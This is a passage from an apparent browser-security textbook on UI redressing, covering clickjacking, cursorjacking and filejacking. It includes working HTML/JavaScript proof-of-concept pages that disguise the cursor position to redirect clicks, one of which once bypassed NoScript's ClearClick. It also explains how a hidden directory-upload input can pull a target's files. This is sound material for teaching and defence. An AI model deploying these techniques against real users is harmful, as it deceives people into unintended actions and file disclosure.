
When the user decides to click somewhere, the click will trigger the `onClick` event of the button in the framed page. As you have seen in the source of the framed page, this will result in an Alert dialog, as shown in [Figure 4-14](#c04.html#figure4-14).

start figure 

[**Figure 4-14:**](#c04.html#figureanchor4-14) Successful Clickjacking

![c04f014.tif](image_fi/662090c04/c04f014.png)

end figure 

Note that in the previous figures, you can see the background and the button under the mouse cursor. This is because, for the sake of the demonstration, the opacity has not been set to hide the IFrame’s content.

### Using Cursorjacking

This section will explore similar attacks to Clickjacking, however this time the attack is focused on the mouse cursor. Cursorjacking comes in handy if you need to mount complex UI redressing attacks.

start feature 

* * *

**NoScript ClearClick** NoScript is one of the more popular Firefox extensions designed to help prevent XSS, XSRF, and various UI redressing attacks. Its ClearClick32 functionality helps with identifying and preventing Clickjacking attacks by taking a screenshot of the framed page and the parent page, as you would normally see it. If the two screenshots are different, then a Clickjacking attack is identified. Using this technique, NoScript is able to identify clicks on page elements that are transparent and which are potentially being used to deliver Clickjacking attacks. 

* * *

end feature 

The first examples of Cursorjacking were demonstrated by Eddy Bordi, and then refined by Marcus Niemietz.33 Cursorjacking deceives users by means of a custom cursor image, where the pointer is displayed with an offset. The displayed cursor is shifted to the right from the actual mouse position. An attacker can then direct user clicks to desired and well-positioned elements. Consider the following page:

```
<html>
<head>
<style type="text/css"> 
 #c {
  cursor:url("http://localhost/basic_cursorjacking
  /new_cursor.png"),default;
 }
 #c input{
  cursor:url("http://localhost/basic_cursorjacking
  /new_cursor.png"),default;
 }
</style> 
</head>
<body>
 <h1> CursorJacking. Click on the 'Second' or 'Fourth' buttons. </h1>
<div id="c">
  <input type="button" value="First" onclick="alert('clicked on 1')">
          
  <input type="button" value="Second" onclick="alert('clicked on 2')">
          <br></br>
  <input type="button" value="Third" onclick="alert('clicked on 3')">
          
  <input type="button" value="Fourth" onclick="alert('clicked on 4')">
          
</div>
</body>
</html>
```

From the CSS definition, you can see the mouse cursor is changed with a custom image. The image, as you can see in [Figure 4-15](#c04.html#figure4-15), contains a mouse icon that is moved to a static offset on the right.

start figure 

[**Figure 4-15:**](#c04.html#figureanchor4-15) Clicking the Second button results in clicking the First button.

![c04f015.tif](image_fi/662090c04/c04f015.png)

end figure 

For demonstrative purposes, the image background is visible. In a real attack, the image would still be a PNG but with a transparent background. When the target tries to click the Second or Fourth buttons in the page, they will actually be clicking the buttons on the left of the page. The real positioning of the mouse cursor is hidden using the new cursor image.

Krzysztof Kotowicz34 and Mario Heiderich extended these Cursorjacking techniques. Their new attack vector relied on completely hiding the cursor in the body of the page and adding the following style to the body element:

```
<body style="cursor:none">
```

A different cursor image is then dynamically overlaid and is associated with mousemove events. The following code demonstrates this technique:

```
<html>
<head><title>Advanced cursorjacking by Kotowicz & Heiderich</title>
<style>
body,html {margin:0;padding:0}
</style>
</head>
<body style="cursor:none;height: 1000px;">
<img style="position: absolute;z-index:1000;" id=cursor 
 src="cursor.png" />
<div style=margin-left:300px;">
<h1>Is this a good example of cursorjacking?</h1>
</div>
<button style="font-size:
150%;position:absolute;top:130px;left:630px;">YES</button>
<button style="font-size: 150%;position:absolute;top:130px;
left:680px;">NO</button>
<div style="opacity:1;position:absolute;top:130px;left:30px;">
<a href="https://twitter.com/share" class="twitter-share-button"
data-via="kkotowicz" data-size="small">Tweet</a>
<script>!function(d,s,id){var 
js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id))
{js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/
widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,
"script","twitter-wjs");</script>
</div>
<script>
function shake(n) {
 if (parent.moveBy) {
 for (i = 10; i > 0; i--) {
  for (j = n; j > 0; j--) {
   parent.moveBy(0,i);
   parent.moveBy(i,0);
   parent.moveBy(0,-i);
   parent.moveBy(-i,0);
  }
 }
 }
}

shake(5);
  var  oNode = document.getElementById('cursor');

  var onmove = function (e) {  
    var nMoveX =  e.clientX, nMoveY =  e.clientY; 
    oNode.style.left = (nMoveX + 600)+"px";  
    oNode.style.top = nMoveY + "px";  
  }; 
  document.body.addEventListener('mousemove', onmove, true);
</script>
</body>
```

First, the mouse cursor image is replaced with a custom image. Second, a new event listener is then attached to the page body, listening for mousemove events. When the real mouse is moved, the events trigger the listener that results in the fake mouse cursor (the visible one) moving accordingly.

With JavaScript, the real cursor movements are followed (on both x and y coordinates), and the position of the fake cursor is updated. As you may realize, the same technique was used in the previous section on advanced Clickjacking. The results can be seen in [Figure 4-16](#c04.html#figure4-16), when the target clicks the YES button, they’re actually clicking on the Twitter button.

start figure 

[**Figure 4-16:**](#c04.html#figureanchor4-16) Clicking the YES button results in clicking the Twitter button.

![c04f016.tif](image_fi/662090c04/c04f016.png)

end figure 

This new Cursorjacking technique originally bypassed NoScript’s ClearClick protection. Remember what was discussed earlier about the protection offered by ClearClick, which is its ability to be able to identify if a click is done on a transparent (opaque=0) element? Well, in the previous example, the real click is done in a non-opaque region of the page (the Twitter button), so NoScript couldn’t detect the attack. This ClearClick bypass has been addressed in NoScript version 2.2.8 RC1.35

### Using Filejacking

Filejacking allows the extrusion of directory contents from the target’s underlying OS to the attacker’s server through clever UI manipulation within the browser. The result is that under certain conditions, you can download files from the target’s machine. The two prerequisites to successfully perform this attack are:

Level1 **1.** The target must use Chrome, because it’s currently the only browser that supports directory and webkitdirectory input attributes like the following: 

```
<input type="file" id="file_x " webkitdirectory directory />
```

**2.** The attack relies on baiting the target into clicking somewhere, similar to other UI redressing techniques. In this case, the input element presented is hidden behind a button element, with the common opacity CSS trick you’ve seen in the previous pages. 

/Level1

Kotowicz36 first published this UI redressing research in 2011 after analyzing the impact of delivering Filejacking attacks to users baited with social engineering tricks.
